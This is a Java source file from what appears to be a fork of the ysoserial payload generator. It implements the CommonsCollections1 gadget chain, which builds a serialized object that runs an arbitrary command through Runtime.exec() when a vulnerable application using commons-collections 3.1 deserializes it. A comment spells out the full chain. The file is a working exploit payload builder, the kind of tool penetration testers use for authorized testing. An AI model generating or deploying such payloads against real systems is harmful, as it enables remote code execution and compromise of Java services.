package com.h2tg.ysogate.payloads.gadgets;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

import com.h2tg.ysogate.utils.PayloadRunner;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.map.LazyMap;

import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.JavaVersion;
import com.h2tg.ysogate.utils.Reflections;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.FROHOFF})
public class CommonsCollections1 implements CommandObjectPayload<InvocationHandler>
{

	public InvocationHandler getObject(final String command) throws Exception {
		final Transformer transformerChain = new ChainedTransformer(
				new Transformer[]{new ConstantTransformer(1)});
		// real chain for after setup
		final Transformer[] transformers = Gadgets.makeTransformer(command);

		final Map               innerMap = new HashMap();
		final Map               lazyMap  = LazyMap.decorate(innerMap, transformerChain);
		final Map               mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
		final InvocationHandler handler  = Gadgets.createMemoizedInvocationHandler(mapProxy);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return handler;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections1.class, args);
	}
	public static boolean isApplicableJavaVersion() {
		return JavaVersion.isAnnInvHUniversalMethodImpl();
	}
}
